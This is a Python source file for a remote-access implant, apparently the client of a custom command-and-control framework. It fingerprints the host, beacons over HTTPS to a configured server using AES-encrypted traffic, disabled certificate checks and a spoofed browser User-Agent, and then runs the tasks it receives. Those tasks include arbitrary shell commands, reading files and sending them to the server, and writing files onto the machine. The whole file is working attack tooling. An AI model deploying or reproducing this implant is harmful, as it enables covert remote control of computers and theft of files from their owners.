import os
import socket
import platform
import subprocess
import datetime
import base64
import json
import requests
import threading
import time
import warnings
from urllib3.exceptions import InsecureRequestWarning
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import uuid
import getpass
import psutil

# Suppress InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

# Configuration Variables
# change this to the ip of the server
SERVER = '192.168.1.19'
PORT = '443'
JITTER = 50
SLEEP = 2
# change this to your aes key, which is printed by the server on startup
AES_KEY = 'xalxACRIZkmDkMYu-BB0ec49-Qzj7aByCHaEtgm1jwI'  # Updated AES key from the user
# adversary is a baked in session id that the server will use to identify the implant
# make sure you uncomment the code in server that adds this session id to the database
SESSION = 'adversary'

class ImpInfo:
    def __init__(self, session, ip, username, domain, os_version, imp_pid, process_name, sleep):
        self.session = session
        self.ip = ip
        self.username = username
        self.domain = domain
        self.os = os_version
        self.imp_pid = imp_pid
        self.process_name = process_name
        self.sleep = sleep

class OutputData:
    def __init__(self, session, task_name, output):
        self.session = session
        self.task_name = task_name
        self.output = output

class SleepTime:
    def __init__(self, sleep):
        self.sleep = sleep

def encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def decode(data: str) -> bytes:
    padding = '=' * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

def get_external_ip() -> str:
    try:
        response = requests.get("https://api.ipify.org", timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except Exception as e:
        print(f"Error getting external IP: {e}")
    return "Unknown"

def get_username() -> str:
    try:
        username = getpass.getuser()
        hostname = socket.gethostname()
        return f"{hostname}\\{username}"
    except Exception as e:
        print(f"Error getting username: {e}")
        return "Unknown\\Unknown"

def get_domain() -> str:
    try:
        domain = os.environ.get('USERDOMAIN', 'Unknown')
        return domain
    except Exception as e:
        print(f"Error getting domain: {e}")
        return "Unknown"

def get_os_version() -> str:
    try:
        return platform.platform()
    except Exception as e:
        print(f"Error getting OS version: {e}")
        return "Unknown"

def get_pid() -> str:
    try:
        return str(os.getpid())
    except Exception as e:
        print(f"Error getting PID: {e}")
        return "Unknown"

def get_process_name() -> str:
    try:
        return psutil.Process(os.getpid()).name()
    except Exception as e:
        print(f"Error getting process name: {e}")
        return "Unknown"

def read_and_encode(args: list) -> str:
    try:
        file_path = args[1] if len(args) > 1 else ""
        with open(file_path, 'rb') as f:
            content = f.read()
        encoded_content = encode(content)
        print(f"Encoded content from {file_path}")
        return encoded_content
    except Exception as e:
        error_msg = f"Error in read_and_encode: {str(e)}"
        print(error_msg)
        return error_msg

def read_and_decode(args: list) -> str:
    try:
        file_path = args[1] if len(args) > 1 else ""
        encoded_content = args[2] if len(args) > 2 else ""
        decoded_content = decode(encoded_content)
        with open(file_path, 'wb') as f:
            f.write(decoded_content)
        print(f"Decoded and wrote content to {file_path}")
        return "File written successfully"
    except Exception as e:
        error_msg = f"Error in read_and_decode: {str(e)}"
        print(error_msg)
        return error_msg

def execute_command(command: str) -> str:
    try:
        print(f"Executing command: {command}")
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        print(f"Command output: {result}")
        return result
    except subprocess.CalledProcessError as e:
        error_output = e.output
        print(f"Command execution failed: {error_output}")
        return error_output
    except Exception as e:
        error_msg = f"Error executing command '{command}': {str(e)}"
        print(error_msg)
        return error_msg

def run_tasks(tasks: str) -> str:
    output = ""
    print(f"Received tasks: {tasks}")
    for task in tasks.split(','):
        args = task.strip().split(' ')
        if not args:
            continue
        cmd = args[0].lower()
        print(f"Running task: {cmd}")
        if cmd == "whoami":
            task_output = execute_command("whoami")
            output += task_output
        elif cmd == "cd":
            directory = args[1] if len(args) > 1 else ""
            try:
                os.chdir(directory)
                msg = f"Changed directory to: {directory}\n"
                print(msg)
                output += msg
            except Exception as e:
                error_msg = f"Could not change directory: {str(e)}\n"
                print(error_msg)
                output += error_msg
        elif cmd == "pwd":
            current_dir = os.getcwd()
            msg = f"Current directory: {current_dir}\n"
            print(msg)
            output += msg
        elif cmd == "dir":
            directory = args[1] if len(args) > 1 else "."
            task_output = execute_command(f"dir {directory}")
            output += task_output
        elif cmd == "typefile":
            file_path = args[1] if len(args) > 1 else ""
            try:
                with open(file_path, 'r') as f:
                    file_content = f.read()
                print(f"Content of {file_path}:\n{file_content}")
                output += file_content
            except Exception as e:
                error_msg = f"Could not read file: {str(e)}\n"
                print(error_msg)
                output += error_msg
        elif cmd == "getfile":
            encoded = read_and_encode(args)
            output += encoded + "\n"
        elif cmd == "sendfile":
            decode_msg = read_and_decode(args)
            output += decode_msg + "\n"
        elif cmd in ["sh", "shell"]:
            command = ' '.join(args[1:]) if len(args) > 1 else ""
            task_output = execute_command(command)
            output += task_output
        elif cmd == "kill":
            msg = "Killing the implant\n"
            print(msg)
            output += msg
            os._exit(0)
        else:
            unknown_msg = f"Unknown task: {task}\n"
            print(unknown_msg)
            output += unknown_msg
    return output

def encrypt_data(aes_key: bytes, data: str) -> str:
    try:
        iv = bytes([0]*16)
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        pad_length = 16 - (len(data.encode()) % 16)
        padded_data = data.encode() + bytes([pad_length]*pad_length)
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        encoded_encrypted = encode(encrypted)
        print(f"Encrypted data: {encoded_encrypted}")
        return encoded_encrypted
    except Exception as e:
        error_msg = f"Error in encrypt_data: {str(e)}"
        print(error_msg)
        return ""

def decrypt_data(aes_key: bytes, data: str) -> str:
    try:
        iv = bytes([0]*16)
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(decode(data)) + decryptor.finalize()
        pad_length = decrypted[-1]
        decrypted_data = decrypted[:-pad_length].decode()
        print(f"Decrypted data: {decrypted_data}")
        return decrypted_data
    except Exception as e:
        error_msg = f"Error in decrypt_data: {str(e)}"
        print(error_msg)
        return ""

def send_request(imp_info: ImpInfo):
    while True:
        try:
            server = SERVER
            port = PORT
            jitter = JITTER
            sleep_time = SLEEP
            aes_key_encoded = AES_KEY
            # Decode AES_KEY from base64
            aes_key = decode(aes_key_encoded) if aes_key_encoded else b'0'*32

            checkin_url = f"https://{server}:{port}/js"
            index_url = f"https://{server}:{port}/index"
            return_out_url = f"https://{server}:{port}/return_out"

            serialized_data = json.dumps(imp_info.__dict__)
            encrypted_data = encrypt_data(aes_key, serialized_data)

            headers = {
                "X-Unique-Identifier": imp_info.session,
                "Content-Type": "text/plain"
            }

            print(f"Sending checkin to {checkin_url} with session {imp_info.session}")
            response = requests.post(checkin_url, data=encrypted_data, headers=headers, verify=False, timeout=10)
            print(f"Checkin response status: {response.status_code}")

            if response.ok:
                imp_token = response.text.strip('"')
                print(f"Received session token: {imp_token}")
                if not imp_token:
                    print("No token received, sleeping...")
                    time.sleep(sleep_time)
                    continue

                while True:
                    sleep_payload = SleepTime(sleep=str(sleep_time))
                    serialized_sleep = json.dumps(sleep_payload.__dict__)
                    encrypted_sleep = encrypt_data(aes_key, serialized_sleep)

                    headers_index = {
                        "X-Session": imp_token,
                        "User-Agent": "Mozilla/5.0",
                        "Content-Type": "text/plain"
                    }

                    print(f"Sending index request to {index_url} with token {imp_token}")
                    index_response = requests.post(index_url, data=encrypted_sleep, headers=headers_index, verify=False, timeout=10)
                    print(f"Index response status: {index_response.status_code}")

                    if index_response.ok:
                        tasks = index_response.text
                        print(f"Received tasks: {tasks}")
                        if not tasks:
                            print("No tasks received, sleeping...")
                            time.sleep(sleep_time)
                            continue
                        try:
                            tasks_list = json.loads(tasks)
                            tasks_str = ','.join(tasks_list)
                            print(f"Parsed tasks: {tasks_str}")
                        except json.JSONDecodeError as e:
                            print(f"Error parsing tasks JSON: {e}")
                            time.sleep(sleep_time)
                            continue
                        output = run_tasks(tasks_str)
                        output_data = OutputData(session=imp_token, task_name=tasks_str, output=output)
                        serialized_output = json.dumps(output_data.__dict__)
                        encrypted_output = encrypt_data(aes_key, serialized_output)

                        headers_return = {
                            "X-Session": imp_token,
                            "Content-Type": "text/plain"
                        }

                        print(f"Sending output to {return_out_url}")
                        return_response = requests.post(return_out_url, data=encrypted_output, headers=headers_return, verify=False, timeout=10)
                        print(f"Return response status: {return_response.status_code}")
                        time.sleep(sleep_time)
                    else:
                        print("Index request failed, sleeping...")
                        time.sleep(sleep_time)
            else:
                print("Checkin request failed, sleeping...")
                time.sleep(sleep_time)
        except Exception as e:
            print(f"Exception in send_request: {e}")
            time.sleep(sleep_time)

def main():
    session = SESSION
    ip = get_external_ip()
    username = get_username()
    domain = get_domain()
    os_version = get_os_version()
    imp_pid = get_pid()
    process_name = get_process_name()
    sleep = str(SLEEP)  # Ensure sleep is a string

    imp_info = ImpInfo(session, ip, username, domain, os_version, imp_pid, process_name, sleep)
    print(f"Initialized ImpInfo: {imp_info.__dict__}")
    send_request(imp_info)

if __name__ == "__main__":
    main()
